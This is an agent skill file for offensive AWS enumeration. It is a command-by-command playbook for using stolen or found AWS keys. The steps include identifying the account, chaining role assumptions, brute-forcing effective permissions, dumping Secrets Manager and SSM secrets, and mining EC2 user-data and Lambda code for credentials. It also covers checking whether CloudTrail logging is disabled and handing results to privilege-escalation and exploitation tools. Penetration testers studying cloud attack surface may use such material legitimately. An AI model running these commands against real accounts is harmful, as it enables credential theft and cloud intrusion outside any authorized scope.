---
name: aws-enumeration
description: Exhaustive manual AWS enumeration with the aws CLI and enumerate-iam — identity/STS triage, permission brute-forcing when IAM read is denied, full multi-region service sweep (EC2 user-data, snapshots, Lambda code, secrets, trust policies, and more), normalized into an inventory and work units for privesc and loot follow-up.
license: Apache-2.0
metadata:
  author: Section9Labs
  domain: cloud
---

# AWS enumeration — the manual sweep behind the scanners

Scanners (CloudFox, ScoutSuite) summarize; the `aws` CLI shows you everything,
including what the scanners skip: user-data, snapshot sharing, trust-policy
documents, Lambda code URLs. Use this skill with any AWS credential — stolen keys,
instance-profile creds, an assumed role — especially when you need to go deeper
than `cloudfox` output or your IAM read access is partial. Part of the
`cloud-security` umbrella.

## 1. Identity and STS triage — always first

```
aws configure list-profiles                          # what creds are already on this box
aws sts get-caller-identity --profile target         # who am I, which account
aws sts get-access-key-info --access-key-id AKIA...  # account ID from a bare key — works
                                                     # with ANY valid caller, low-noise,
                                                     # no access to the key's account needed
```

Found creds? Load them without touching disk:
`AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity`
(key IDs: `AKIA` = long-term user key, `ASIA` = temporary/session — session needs the token).

Assume a role (from a trust policy you found, or a loot file):

```
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin-role \
  --role-session-name x [--external-id <id>]
```

Export the three `Credentials` fields from the JSON. Chain assumptions hop by hop —
cross-account trust is the #1 scanner blind spot.

## 2. Permission discovery when IAM read is denied

If `aws iam list-attached-user-policies ...` returns AccessDenied, brute-force what
the key can actually do with **enumerate-iam** (andresriancho/enumerate-iam):

```
git clone https://github.com/andresriancho/enumerate-iam && cd enumerate-iam
pip install -r requirements.txt && python3 enumerate_iam.py \
  --access-key AKIA... --secret-key ... [--session-token ...] [--region us-east-1]
```

It fires every read-only API call and logs which succeed — the output lines
(`-- s3.list_buckets() worked!`) and its JSON bruteforce map are your effective
permission set. Very loud in CloudTrail (thousands of calls); it is the trade for
visibility. Quieter alternative when `iam:SimulatePrincipalPolicy` is allowed:

```
aws iam simulate-principal-policy --policy-source-arn <your-arn> \
  --action-names s3:GetObject iam:PassRole sts:AssumeRole lambda:InvokeFunction \
  secretsmanager:GetSecretValue ssm:SendCommand ec2:RunInstances
```

When IAM read IS allowed, pull everything at once:
`aws iam get-account-authorization-details --output json` — all users, roles,
groups, policies, and **trust documents** in one call.

## 3. Multi-region sweep — enumerate ALL regions

Resources hide in regions nobody uses. Get the full list first, then loop:

```
aws ec2 describe-regions --all-regions \
  --query 'Regions[].RegionName' --output text
for r in $(aws ec2 describe-regions --all-regions --query 'Regions[].RegionName' --output text); do
  aws ec2 describe-instances --region "$r" --output json
done
```

Or let the wrapper do the whole sweep (step 5). Per-service highlights — the full
command set with every flag is in `references/service-sweep.md`:

- **EC2**: `describe-instances` (IPs + instance profiles);
  `describe-instance-attribute --instance-id i-0abc --attribute userData` then
  base64-decode — user-data is a classic credential dump;
  `describe-snapshots --owner-ids self` + `describe-snapshot-attribute
  --attribute createVolumePermission` (public/shared snapshots = mountable disks);
  `describe-images --owners self`; `describe-security-groups` (0.0.0.0/0 ingress).
- **S3**: `s3api list-buckets`, per bucket `get-bucket-policy`,
  `get-public-access-block`, `get-bucket-acl` → hand to `cloud-storage-exposure`.
- **Lambda**: `list-functions` (env vars inline!); `get-function --function-name X`
  returns a **presigned `Code.Location` URL** — `curl` it, unzip, grep the source.
- **SecretsManager/SSM**: `list-secrets` → `get-secret-value --secret-id <arn>`;
  `ssm get-parameters-by-path --path / --recursive --with-decryption` dumps every
  decryptable parameter in one shot.
- **IAM**: `list-users`, `list-roles` (**read every `AssumeRolePolicyDocument`
  yourself** — cross-account and wildcard trusts are where scanners fail),
  `list-policies --scope Local`, `get-policy-version`.
- **RDS/DynamoDB**: `describe-db-instances` (PubliclyAccessible + endpoint),
  `list-tables` → `scan` small tables.
- **ECS/EKS/ECR**: task definitions carry env secrets; `ecr get-login-password` +
  pull images; `eks describe-cluster` (public API endpoint?).
- **CloudTrail**: `describe-trails` + `get-trail-status` — is logging even on, and
  in which regions? No trail = free rein; also a finding.
- **Route53 / SNS / SQS / API Gateway / ELB / CloudFront / KMS**: hosted zones,
  topic/queue policies (public?), invoke URLs, internet-facing LBs, distributions,
  key policies trusting foreign accounts.

## 4. Reading what matters

- Any `Principal` containing another account ID or `"*"` in a trust/resource/key
  policy → pivot or exposure. Grep for it: `grep -r '"AWS"' inventory/raw/ | grep -v <your-acct>`.
- `IamInstanceProfile` on an instance → role creds via IMDS → `metadata-ssrf-pivot`.
- `Environment.Variables` in Lambda, `environment` in ECS task defs, decoded
  user-data, SSM params → `trufflehog`.
- `PubliclyAccessible: true`, `Scheme: internet-facing`, public snapshot/AMI,
  0.0.0.0/0 security groups → external attack surface.
- AccessDenied on a juicy call → record it; it becomes a `pmapper`/`pacu` privesc
  objective, not a dead end.

## 5. Scripted sweep and work units (rupu handoff)

```
python3 scripts/aws_enum.py --profile target --regions all \
    --services ec2,s3,iam,sts,lambda,rds,dynamodb,secretsmanager,ssm,ecs,eks,ecr,sns,sqs,apigateway,elbv2,cloudfront,route53,cloudtrail,kms \
    --outdir out/awsenum
python3 scripts/aws_to_work_units.py --inventory out/awsenum/inventory.json \
    --out out/work-units.json --assets out/assets.json
```

`aws_enum.py` shells the `aws` CLI (`--output json`, auto-paginated) across every
region for the chosen services, saves raw responses under `out/awsenum/raw/`, and
writes a normalized `inventory.json`. `aws_to_work_units.py` emits a bare JSON
array of work units — one per public resource (instance/LB/API/distribution/RDS/
open SG), per principal (cross-account or wildcard trust, instance profile), per
secret (SecretsManager/SSM/Lambda env) — each `{"id","title","targets","hints"}` —
plus an assets list. rupu wiring, `assets.mark`, `findings.report`:
`references/rupu.md`.

## 6. Chain to sibling skills

- Principals, trust docs, enumerate-iam results → **`pmapper`** (build the privesc
  graph) then **`pacu`** (exploit it).
- Bucket list → **`cloud-storage-exposure`**.
- Secret values, env vars, user-data, Lambda code → **`trufflehog`**.
- Instances with profiles → **`metadata-ssrf-pivot`**.
- Broad automated pass of the same account → **`cloudfox`**; umbrella: **`cloud-security`**.
